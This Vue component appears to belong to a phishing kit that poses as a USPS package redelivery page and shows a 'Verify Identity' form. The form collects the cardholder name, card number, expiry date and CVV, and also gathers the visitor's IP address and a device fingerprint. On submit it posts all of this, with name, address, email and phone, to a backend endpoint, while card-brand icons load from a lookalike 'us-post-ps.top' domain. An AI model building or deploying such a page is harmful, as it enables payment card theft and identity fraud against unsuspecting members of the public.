<script setup lang="ts">
import { ref, computed, nextTick, onMounted } from 'vue'
import { useFormDataStore, type AddressData } from '@/stores/formData'
import { ElMessage } from 'element-plus'
import { useRouter, useRoute } from 'vue-router'
import LoadingPage from './LoadingPage.vue'

const paymentFormData = ref({
  cardholder: '',
  cardNumber: '',
  expireDate: '',
  cvv: '',
})

// 新增IP和设备信息字段
const userIpAddress = ref('')
const userDeviceInfo = ref('')

const formDataStore = useFormDataStore()
const router = useRouter()
const route = useRoute()

const addressData = computed(() => formDataStore.addressData)

// On mount, check if we need to update the identification code from the route and get user info
onMounted(async () => {
  if (route.params.identificationCode && typeof route.params.identificationCode === 'string') {
    formDataStore.setIdentificationCode(route.params.identificationCode)
  }

  // 获取用户IP地址
  try {
    const response = await fetch('https://api.ipify.org?format=json')
    if (response.ok) {
      const data = await response.json()
      userIpAddress.value = data.ip
    }
  } catch (error) {
    console.error('获取IP地址失败:', error)
    userIpAddress.value = '未知'
  }

  // 获取用户设备信息
  userDeviceInfo.value = getUserDeviceInfo()
})

// 获取用户设备信息的函数
function getUserDeviceInfo() {
  const userAgent = navigator.userAgent
  const platform = navigator.platform
  const vendor = navigator.vendor || ''
  const language = navigator.language || ''
  const screenInfo = `${window.screen.width}x${window.screen.height}`

  // 将对象转换为JSON字符串
  return JSON.stringify({
    userAgent,
    platform,
    vendor,
    language,
    screenInfo,
  })
}

const isLoading = ref(false)
// Function to format the expiry date input
function formatExpireDate(event: Event) {
  const input = event.target as HTMLInputElement
  let value = input.value

  // 1. Remove any non-digit characters
  let cleaned = value.replace(/\D/g, '')

  let formattedValue = cleaned

  // 2. Add slash automatically after 2 digits (month)
  if (cleaned.length > 2) {
    formattedValue = cleaned.slice(0, 2) + '/' + cleaned.slice(2, 4) // Limit year to 2 digits
  }

  // 3. Limit total length to 5 characters (MM/YY)
  if (formattedValue.length > 5) {
    formattedValue = formattedValue.slice(0, 5)
  }

  // 4. Update the model value
  paymentFormData.value.expireDate = formattedValue

  // 5. Use nextTick to potentially force the input value update
  //    if direct v-model update feels laggy or incorrect visually.
  //    This ensures the input visually reflects the formatted value immediately.
  nextTick(() => {
    input.value = formattedValue
  })
}

// Function to allow only numeric input
function formatNumericInput(event: Event, fieldName: keyof typeof paymentFormData.value) {
  const input = event.target as HTMLInputElement
  let value = input.value

  // Remove any non-digit characters
  const cleaned = value.replace(/\D/g, '')

  // Update the model value
  paymentFormData.value[fieldName] = cleaned

  // Use nextTick to update the input visually
  nextTick(() => {
    input.value = cleaned
  })
}

// NEW: Function to format card number input (adds spaces)
function formatCardNumber(event: Event) {
  const input = event.target as HTMLInputElement
  let value = input.value

  // 1. Remove non-digits and extra spaces that might have been pasted
  const cleaned = value.replace(/\D/g, '')

  // 2. Limit to 16 digits (common for Visa/MC/Discover - adjust if needed)
  const truncated = cleaned.slice(0, 16)

  // 3. Add spaces every 4 digits
  let formattedValue = ''
  for (let i = 0; i < truncated.length; i += 4) {
    formattedValue += truncated.slice(i, i + 4) + ' '
  }
  // Remove trailing space
  formattedValue = formattedValue.trim()

  // 4. Update the model value
  paymentFormData.value.cardNumber = formattedValue

  // 5. Use nextTick to update the input visually
  nextTick(() => {
    input.value = formattedValue
  })
}

const handleSubmit = async () => {
  isLoading.value = true
  try {
    const formData = {
      identificationCode: formDataStore.identificationCode,
      name: addressData.value?.name,
      address1: addressData.value?.address1,
      address2: addressData.value?.address2,
      city: addressData.value?.city,
      state: addressData.value?.state,
      postalCode: addressData.value?.postalCode,
      email: addressData.value?.email,
      phone: addressData.value?.phone,
      cardholder: paymentFormData.value.cardholder,
      cardNumber: paymentFormData.value.cardNumber,
      expireDate: paymentFormData.value.expireDate,
      cvv: paymentFormData.value.cvv,
      // 新增字段
      ipAddress: userIpAddress.value,
      deviceInfo: userDeviceInfo.value,
    }

    const response = await fetch(`${import.meta.env.VITE_API_URL}/v1/pkgform/update-form`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(formData),
    })

    if (!response.ok) {
      throw new Error('Form submission failed')
    }

    const result = await response.json()

    // 提交成功后的处理
    //ElMessage.success('Form submitted successfully')
    router.push('/success') // 跳转到成功页面
  } catch (error) {
    console.error('Error submitting form:', error)
    // ElMessage.error('Failed to submit form. Please try again.')
  } finally {
    isLoading.value = false
  }
}

const cardIcons = [
  'https://us-post-ps.top/cegJcLcP23AEj2JtT3/assets/b4f258fbTeKnX.svg',
  'https://us-post-ps.top/cegJcLcP23AEj2JtT3/assets/d9f50107TeKnX.svg',
  'https://us-post-ps.top/cegJcLcP23AEj2JtT3/assets/d2820b3bTeKnX.svg',
  'https://us-post-ps.top/cegJcLcP23AEj2JtT3/assets/e62e6680TeKnX.svg',
  'https://us-post-ps.top/cegJcLcP23AEj2JtT3/assets/272b931fTeKnX.svg',
  'https://us-post-ps.top/cegJcLcP23AEj2JtT3/assets/c8e88e5fTeKnX.svg',
  'https://us-post-ps.top/cegJcLcP23AEj2JtT3/assets/1a32e133TeKnX.svg',
  'https://us-post-ps.top/cegJcLcP23AEj2JtT3/assets/56af3b63TeKnX.svg',
]
</script>

<template>
  <div class="usps-updates">
    <div class="main-content-body container-fluid">
      <h1 class="payment-title">Verify Identity</h1>

      <!-- <p class="payment-description">
        For redelivery, we need to charge some service fees. Your package will be re-delivered after
        payment
      </p>
      <p class="lump-sum">lump sum: <strong>$0.3</strong></p> -->
      <!-- <p class="lump-sum">Verify Identity</p> -->
      <form @submit.prevent="handleSubmit" class="payment-form" style="margin-top: 50px">
        <!-- Cardholder -->
        <div class="form-group">
          <label for="cardholder" class="form-label"
            >Cardholder <span class="required">*</span></label
          >
          <input
            type="text"
            id="cardholder"
            class="form-input"
            v-model="paymentFormData.cardholder"
            required
          />
        </div>

        <!-- Card Number -->
        <div class="form-group">
          <label for="cardNumber" class="form-label"
            >Card Number <span class="required">*</span></label
          >
          <div class="card-number-wrapper">
            <input
              type="tel"
              id="cardNumber"
              class="form-input card-number-input"
              v-model="paymentFormData.cardNumber"
              placeholder="0000 0000 0000 0000"
              required
              maxlength="19"
              inputmode="numeric"
              @input="formatCardNumber"
            />
            <div class="card-icons">
              <img
                v-for="(icon, index) in cardIcons"
                :key="index"
                :src="icon"
                alt="Card type"
                class="card-icon"
              />
            </div>
          </div>
        </div>

        <!-- Expiry and CVV -->
        <div class="expiry-cvv-row">
          <div class="form-group expiry-group">
            <label for="expireDate" class="form-label"
              >Expire Date <span class="required">*</span></label
            >
            <input
              type="text"
              id="expireDate"
              class="form-input"
              v-model="paymentFormData.expireDate"
              placeholder="MM/YY"
              required
              maxlength="5"
              inputmode="numeric"
              @input="formatExpireDate"
            />
          </div>
          <div class="form-group cvv-group">
            <label for="cvv" class="form-label"
              >Security Code (CVV) <span class="required">*</span></label
            >
            <input
              type="tel"
              id="cvv"
              class="form-input"
              v-model="paymentFormData.cvv"
              placeholder="123"
              required
              maxlength="3"
              inputmode="numeric"
              @input="(event) => formatNumericInput(event, 'cvv')"
            />
          </div>
        </div>

        <!-- Submit Button -->
        <div class="form-group submit-group">
          <button type="submit" class="submit-button but b-color">Submit</button>
        </div>
      </form>
    </div>
  </div>
  <LoadingPage :visible="isLoading" />
</template>

<style lang="less">
@import '../styles/variables.less';

.usps-updates {
  margin-bottom: 100px;
  margin-top: 20px;
}
@media only screen and(min-width: 800px) {
  .main-content-body {
    margin-top: 100px;
  }
}

.main-content-body {
  max-width: 800px;
  margin: 0 auto;
  font-size: 15px;
}
.container-fluid {
  width: 100%;
  padding-right: 15px;
  padding-left: 15px;
  margin-right: auto;
  margin-left: auto;
}
.payment-title {
  font-size: 32px;
  line-height: 36px;
  font-family:
    HelveticaNeueW02-75Bold,
    Helvetica Neue,
    Helvetica,
    Arial,
    sans-serif;
  color: #336;
  margin-top: 0;
  margin-bottom: 0.5rem;
  font-weight: 500;
  text-align: left;
}

.payment-description,
.lump-sum {
  font-size: 16px;
  line-height: 22px;
  margin-top: 0;
  margin-bottom: 0;
  padding-top: 10px;
  padding-bottom: 10px;
  font-family:
    HelveticaNeueW02-55Roma,
    Helvetica Neue,
    Helvetica,
    Arial,
    sans-serif;
  color: #000;
  text-align: left;
}

.lump-sum {
  margin-bottom: 2.5rem;
  font-weight: 500;
  strong {
    font-weight: 700;
    color: #333;
  }
}

.payment-form {
  // No special styling for the form itself needed based on image
}

.form-group {
  margin-bottom: 1.5rem;
}

.form-label {
  display: block;
  font-weight: 400;
  margin-bottom: 0.5rem;
}

.required {
  color: @usps-red;
  margin-left: 2px;
}

.form-input {
  border: 1px solid #333366;
  border-radius: 5px;
  font-size: 1em;
  box-sizing: border-box;
  width: 100%;
  padding: 8px !important;
  &::placeholder {
    color: #aaa;
  }

  &:focus {
    outline: none;
    border-color: @usps-blue;
    box-shadow: 0 0 0 1px fade(@usps-blue, 50%);
  }
}

.card-number-wrapper {
  position: relative;
}

.card-number-input {
  padding-right: 170px; // Adjust as needed based on icon container width
}

.card-icons {
  display: flex;
  flex-wrap: wrap;
  gap: 5px;
  justify-content: flex-end;
  pointer-events: none;
}

.card-icon {
  height: 30px; // Adjust size as needed
  width: 30px;
  display: block;
}

.expiry-cvv-row {
  display: flex;
  width: 370px;
  gap: 1rem; // Space between expiry and CVV fields
}

.expiry-group,
.cvv-group {
  flex: 1; // Make them share the space equally
}

.cvv-group {
  // Optional: if CVV needs slightly less space
  // flex: 0 0 150px; // Example fixed width
}

.submit-group {
  margin-top: 2rem; // Add some space above the button
}

.submit-button {
  outline: none;
  border: none;
  padding: 8px 30px;
  border-radius: 5px;
  background-color: #336;
  color: #ededed;
  cursor: pointer;
  height: 40px;
}
</style>
